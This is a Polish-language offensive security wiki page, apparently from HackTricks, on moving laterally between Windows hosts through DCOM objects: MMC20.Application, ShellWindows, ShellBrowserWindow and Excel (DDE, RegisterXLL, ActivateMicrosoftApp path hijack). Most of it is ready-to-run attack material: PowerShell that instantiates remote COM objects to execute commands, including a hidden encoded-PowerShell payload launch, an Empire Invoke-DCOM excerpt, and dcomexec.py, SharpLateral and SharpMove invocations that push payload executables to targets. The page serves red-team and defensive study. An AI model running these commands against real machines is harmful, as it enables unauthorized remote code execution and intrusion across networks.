# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

Lateral movement przez DCOM jest atrakcyjny, ponieważ wykorzystuje istniejące serwery COM udostępnione przez RPC/DCOM zamiast tworzyć usługę lub zadanie zaplanowane. W praktyce oznacza to, że początkowe połączenie zwykle rozpoczyna się przez TCP/135, a następnie przechodzi do dynamicznie przydzielanych wysokich portów RPC.

## Wymagania wstępne i pułapki

- Zwykle potrzebny jest kontekst lokalnego administratora na celu, a zdalny serwer COM musi zezwalać na zdalne uruchamianie/aktywację.
- Od **14 marca 2023 r.** firma Microsoft wymusza hardening DCOM w obsługiwanych systemach. Stare klienty, które żądają niskiego poziomu uwierzytelniania aktywacji, mogą zakończyć działanie błędem, chyba że wynegocjują co najmniej `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Nowoczesne klienty Windows zwykle automatycznie podnoszą ten poziom, więc obecne narzędzia zazwyczaj nadal działają.<sup>[[3]](#references)</sup>
- Ręczne lub skryptowane wykonywanie przez DCOM zazwyczaj wymaga TCP/135 oraz zakresu dynamicznych portów RPC celu. Jeśli używasz `dcomexec.py` z Impacket i chcesz otrzymywać wynik poleceń, zwykle potrzebujesz również dostępu SMB do `ADMIN$` (lub innego udziału z możliwością odczytu/zapisu).
- Jeśli RPC/DCOM działa, ale SMB jest zablokowane, `dcomexec.py -nooutput` nadal może być przydatne do ślepego wykonywania.

Szybkie sprawdzenia:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

Więcej informacji o tej technice znajdziesz w [oryginalnym wpisie dotyczącym MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/).<sup>[[1]](#references)</sup>

Distributed Component Object Model (DCOM) objects zapewniają interesujące możliwości interakcji z obiektami za pośrednictwem sieci. Firma Microsoft udostępnia obszerną dokumentację zarówno dla DCOM, jak i Component Object Model (COM), dostępną [tutaj dla DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) oraz [tutaj dla COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Listę aplikacji DCOM można pobrać za pomocą polecenia PowerShell:
```bash
Get-CimInstance Win32_DCOMApplication
```
Obiekt COM, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), umożliwia skryptowanie operacji przystawek MMC. Warto zauważyć, że obiekt ten zawiera metodę `ExecuteShellCommand` w obiekcie `Document.ActiveView`. Więcej informacji o tej metodzie można znaleźć [tutaj](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Sprawdź ją, uruchamiając:<sup>[[6]](#references)</sup>

Funkcja ta umożliwia wykonywanie poleceń przez sieć za pośrednictwem aplikacji DCOM. Aby zdalnie korzystać z DCOM jako administrator, można użyć PowerShell w następujący sposób:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
To polecenie łączy się z aplikacją DCOM i zwraca instancję obiektu COM. Następnie można wywołać metodę ExecuteShellCommand w celu wykonania procesu na zdalnym hoście. Proces obejmuje następujące kroki:

Sprawdź metody:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Uzyskaj RCE:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
Ostatni argument określa styl okna. `7` pozostawia okno zminimalizowane. Z operacyjnego punktu widzenia wykonanie oparte na MMC często prowadzi do uruchomienia zdalnego procesu `mmc.exe`, który tworzy proces z payloadem, co różni się od obiektów opartych na Explorerze opisanych poniżej.

## ShellWindows & ShellBrowserWindow

**Więcej informacji o tej technice znajdziesz w oryginalnym poście [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

Stwierdzono, że obiekt **MMC20.Application** nie ma jawnie zdefiniowanych elementów „LaunchPermissions”, a domyślne uprawnienia zezwalają Administratorom na dostęp. Więcej szczegółów można znaleźć [tutaj](https://twitter.com/tiraniddo/status/817532039771525120), a do filtrowania obiektów bez jawnego Launch Permission zaleca się użycie OleView .NET autorstwa [@tiraniddo](https://twitter.com/tiraniddo).

Wyróżniono dwa konkretne obiekty: `ShellBrowserWindow` i `ShellWindows`, ponieważ nie mają jawnie zdefiniowanych Launch Permissions. Brak wpisu rejestru `LaunchPermission` w `HKCR:\AppID\{guid}` oznacza brak jawnie określonych uprawnień.

W porównaniu z `MMC20.Application` obiekty te są często cichsze z perspektywy OPSEC, ponieważ polecenie zwykle staje się procesem potomnym `explorer.exe` na zdalnym hoście zamiast `mmc.exe`.

### ShellWindows

W przypadku `ShellWindows`, który nie ma ProgID, metody .NET `Type.GetTypeFromCLSID` i `Activator.CreateInstance` umożliwiają utworzenie instancji obiektu przy użyciu jego AppID. Proces ten wykorzystuje OleView .NET do pobrania CLSID dla `ShellWindows`. Po utworzeniu instancji można wejść z nim w interakcję za pomocą metody `WindowsShell.Item`, co prowadzi do wywołania metody takiej jak `Document.Application.ShellExecute`.

Przedstawiono przykładowe polecenia PowerShell służące do utworzenia instancji obiektu i zdalnego wykonania poleceń:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` jest podobny, ale można go utworzyć bezpośrednio za pomocą jego CLSID i przejść do `Document.Application.ShellExecute`:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Lateral Movement z obiektami Excel DCOM

Lateral movement można osiągnąć poprzez wykorzystanie obiektów DCOM programu Excel. Szczegółowe informacje można znaleźć w artykule na blogu [Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom), omawiającym wykorzystanie Excel DDE do lateral movement za pośrednictwem DCOM.<sup>[[5]](#references)</sup>

Projekt Empire udostępnia skrypt PowerShell demonstrujący wykorzystanie programu Excel do zdalnego wykonania kodu (RCE) poprzez manipulowanie obiektami DCOM. Poniżej znajdują się fragmenty skryptu dostępnego w [repozytorium Empire na GitHubie](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), przedstawiające różne metody nadużywania programu Excel w celu uzyskania RCE:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Nowsze badania rozszerzyły ten obszar o metodę `ActivateMicrosoftApp()` obiektu `Excel.Application`. Kluczowa idea polega na tym, że Excel może próbować uruchomić starsze aplikacje Microsoft, takie jak FoxPro, Schedule Plus lub Project, wyszukując je w systemowej zmiennej `PATH`. Jeśli operator może umieścić payload o jednej z oczekiwanych nazw w zapisywalnej lokalizacji należącej do `PATH` celu, Excel go wykona.<sup>[[4]](#references)</sup>

Wymagania dla tej odmiany:

- Uprawnienia local admin na celu
- Excel zainstalowany na celu
- Możliwość zapisania payloadu w zapisywalnym katalogu znajdującym się w `PATH` celu

Praktyczny przykład wykorzystujący wyszukiwanie FoxPro (`FOXPROW.exe`):
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
Jeśli na hoście atakującym nie jest zarejestrowany lokalny ProgID `Excel.Application`, utwórz zdalny obiekt, używając zamiast niego identyfikatora CLSID:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
Wartości, których nadużywanie zaobserwowano w praktyce:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### Narzędzia automatyzujące Lateral Movement

Wyróżniono dwa narzędzia służące do automatyzacji tych technik:

- **Invoke-DCOM.ps1**: Skrypt PowerShell udostępniany przez projekt Empire, który upraszcza wywoływanie różnych metod wykonywania kodu na zdalnych komputerach. Skrypt jest dostępny w repozytorium Empire na GitHubie.

- **SharpLateral**: Narzędzie przeznaczone do zdalnego wykonywania kodu, którego można użyć za pomocą polecenia:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Automatyczne narzędzia

- Skrypt Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) umożliwia łatwe wywoływanie wszystkich opisanych sposobów wykonywania kodu na innych komputerach.
- Możesz użyć `dcomexec.py` z Impacket do wykonywania poleceń w systemach zdalnych za pomocą DCOM. Obecne wersje obsługują `ShellWindows`, `ShellBrowserWindow` i `MMC20`, a domyślnie używają `ShellWindows`.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- Możesz również użyć [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- Możesz również użyć [**SharpMove**](https://github.com/0xthirteen/SharpMove)
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## References

- [1] [Lateral Movement przy użyciu obiektu COM MMC20.Application](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [Lateral Movement za pośrednictwem DCOM: runda 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442 — zarządzanie zmianami dotyczącymi obejścia funkcji zabezpieczeń serwera DCOM systemu Windows (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement: wykorzystanie możliwości aplikacji Excel DCOM](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [Wykorzystanie Excel DDE do Lateral Movement za pośrednictwem DCOM](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com — klasa aplikacji MMC (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
{{#include ../../banners/hacktricks-training.md}}
